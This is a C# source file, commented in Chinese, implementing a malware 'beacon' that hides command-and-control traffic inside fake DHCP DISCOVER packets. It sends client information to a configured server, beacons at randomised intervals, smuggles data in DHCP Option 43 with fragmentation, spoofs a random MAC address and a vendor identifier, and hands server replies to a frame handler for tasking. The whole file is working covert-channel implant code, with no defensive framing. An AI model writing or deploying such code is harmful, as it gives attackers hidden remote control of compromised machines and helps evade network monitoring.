using Beacon.Helper;
using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;

namespace Beacon
{
	internal class DHCPBeacon
	{
		private UdpClient _udp;
		private IPEndPoint _serverEp;
		private volatile bool _running;
		private Thread _recvThread;
		private System.Timers.Timer _heartbeatTimer;
		private readonly object _sendLock = new object();

		public bool Start(string serverIp, int serverPort)
		{
			try
			{
				Stop();
				_udp = new UdpClient();
				_serverEp = new IPEndPoint(IPAddress.Parse(serverIp), serverPort);
				_running = true;
				_recvThread = new Thread(ReceiveLoop) { IsBackground = true };
				_recvThread.Start();

				// 发送初始上线包
				SendDhcpRequest(BeaconHandle.BuildClientInfo());

				// 定时心跳
				_heartbeatTimer = new System.Timers.Timer(new Random().Next(20000, 30000));
				_heartbeatTimer.AutoReset = true;
				_heartbeatTimer.Elapsed += (_, __) =>
				{
					try { BeaconHandle.KeepAlive(SendDhcpRequest); } catch { }
				};
				_heartbeatTimer.Start();
				return true;
			}
			catch
			{
				Stop();
				return false;
			}
		}

		public void Stop()
		{
			try { _heartbeatTimer?.Stop(); } catch { }
			try { _heartbeatTimer?.Dispose(); } catch { }
			_running = false;
			try { _udp?.Close(); } catch { }
			try { _recvThread?.Join(200); } catch { }
		}

		private void SendDhcpRequest(byte[] data)
		{
			if (_udp == null) return;
			try
			{
				// DHCP Option 43 最大255字节，需要分片处理
				const int maxOptionSize = 255;
				if (data.Length <= maxOptionSize)
				{
					// 数据足够小，直接发送
					var packet = BuildDhcpRequest(data);
					lock (_sendLock)
					{
						_udp.Send(packet, packet.Length, _serverEp);
					}
				}
				else
				{
					// 数据太大，需要分片发送
					SendFragmentedData(data);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[DHCPBeacon] 发送失败: {ex.Message}");
			}
		}
		
		private void SendFragmentedData(byte[] data)
		{
			const int maxOptionSize = 255;
			const int headerSize = 4; // 分片头部大小
			const int maxFragmentSize = maxOptionSize - headerSize;
			
			int totalFragments = (int)Math.Ceiling((double)data.Length / maxFragmentSize);
			Console.WriteLine($"[DHCPBeacon] 数据分片: {data.Length}字节 -> {totalFragments}片");
			
			// 生成唯一的分片ID，避免不同数据包的分片混合
			byte fragmentId = (byte)(DateTime.Now.Millisecond % 255 + 1);
			
			for (int i = 0; i < totalFragments; i++)
			{
				int start = i * maxFragmentSize;
				int length = Math.Min(maxFragmentSize, data.Length - start);
				
				// 创建分片数据：分片ID(1) + 总片数(1) + 当前片(1) + 保留(1) + 数据
				var fragment = new byte[headerSize + length];
				fragment[0] = fragmentId; // 分片ID（所有分片使用相同的ID）
				fragment[1] = (byte)totalFragments; // 总片数
				fragment[2] = (byte)(i + 1); // 当前片号
				fragment[3] = 0; // 保留字节
				Buffer.BlockCopy(data, start, fragment, headerSize, length);
				
				Console.WriteLine($"[DHCPBeacon] 发送分片 {i + 1}/{totalFragments}，ID={fragmentId}，长度={fragment.Length}");
				
				var packet = BuildDhcpRequest(fragment);
				lock (_sendLock)
				{
					_udp.Send(packet, packet.Length, _serverEp);
				}
				
				// 分片间延迟，避免网络拥塞
				System.Threading.Thread.Sleep(100);
			}
			
			Console.WriteLine($"[DHCPBeacon] 分片发送完成，共{totalFragments}片");
		}

		private byte[] BuildDhcpRequest(byte[] data)
		{
			// 构造 DHCP DISCOVER 请求
			var packet = new byte[240 + data.Length + 20]; // 基础 + 数据 + 选项
			
			// DHCP 头部
			packet[0] = 0x01; // BOOTREQUEST
			packet[1] = 0x01; // 以太网
			packet[2] = 0x06; // 硬件地址长度
			packet[3] = 0x00; // 跳数
			
			// 事务ID (随机)
			var random = new Random();
			packet[4] = (byte)random.Next(256);
			packet[5] = (byte)random.Next(256);
			packet[6] = (byte)random.Next(256);
			packet[7] = (byte)random.Next(256);
			
			// 客户端IP (0.0.0.0)
			// 你的IP (0.0.0.0)
			// 服务器IP (0.0.0.0)
			// 网关IP (0.0.0.0)
			
			// 客户端硬件地址
			var mac = GetMacAddress();
			Buffer.BlockCopy(mac, 0, packet, 28, 6);
			
			// 添加选项
			int offset = 240;
			
			// Option 53: DHCP Message Type (DISCOVER)
			packet[offset++] = 53;
			packet[offset++] = 1;
			packet[offset++] = 1;
			
			// Option 60: Vendor Class Identifier
			packet[offset++] = 60;
			packet[offset++] = 5;
			packet[offset++] = (byte)'A';
			packet[offset++] = (byte)'V';
			packet[offset++] = (byte)'A';
			packet[offset++] = (byte)'S';
			packet[offset++] = (byte)'-';
			
			// Option 43: Vendor-specific information (我们的数据)
			packet[offset++] = 43;
			packet[offset++] = (byte)data.Length;
			Buffer.BlockCopy(data, 0, packet, offset, data.Length);
			offset += data.Length;
			
			// End option
			packet[offset++] = 255;
			
			return packet;
		}

		private void ReceiveLoop()
		{
			while (_running)
			{
				try
				{
					IPEndPoint remote = null;
					var datagram = _udp.Receive(ref remote);
					if (remote == null) continue;
					
					// 解析 DHCP 响应
					var options = ParseDhcpOptions(datagram);
					if (options.TryGetValue(43, out var vendorData))
					{
						BeaconHandle.OnFrame(SendDhcpRequest, vendorData);
					}
				}
				catch { }
			}
		}

		private static Dictionary<int, byte[]> ParseDhcpOptions(byte[] packet)
		{
			var options = new Dictionary<int, byte[]>();
			int offset = 240; // DHCP 选项开始位置
			
			while (offset < packet.Length - 1)
			{
				int option = packet[offset++];
				if (option == 255) break; // End option
				
				int length = packet[offset++];
				if (offset + length > packet.Length) break;
				
				var value = new byte[length];
				Buffer.BlockCopy(packet, offset, value, 0, length);
				options[option] = value;
				offset += length;
			}
			
			return options;
		}


		private static byte[] GetMacAddress()
		{
			// 获取本机 MAC 地址的简化实现
			var mac = new byte[6];
			var random = new Random();
			for (int i = 0; i < 6; i++)
			{
				mac[i] = (byte)random.Next(256);
			}
			return mac;
		}
	}
}
